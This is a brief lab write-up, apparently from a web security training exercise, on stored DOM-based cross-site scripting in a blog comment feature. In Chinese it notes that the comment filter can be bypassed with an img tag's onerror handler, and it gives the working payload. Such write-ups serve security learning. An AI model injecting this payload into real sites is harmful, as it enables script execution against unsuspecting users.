# Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.

## Cross Site Scripting
* 題目說 comment 有問題，他有做一點過濾，不過用 img 標籤加上 onerror 的寫法就可以過了
```
payload = </p><img src=# onerror=alert(1)>
```